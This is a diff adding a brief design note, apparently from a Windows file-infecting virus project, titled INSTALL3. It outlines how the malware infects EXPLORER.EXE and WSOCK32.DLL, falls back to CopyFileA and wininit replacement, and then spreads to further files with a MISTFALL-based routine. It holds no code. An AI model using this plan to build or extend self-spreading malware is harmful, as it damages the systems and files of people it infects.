@@ -1,0 +1,10 @@
+
+ INSTALL3
+ ~~~~~~~~
+
+ - call INFECTA for EXPLORER.EXE, WSOCK32.DLL
+   if impossible, CopyFileA & try again, then add to wininit
+
+ - when installed into system (working from EXPLORER.EXE),
+   call INFECTB (slow, MISTFALL-based infect) for some files
+
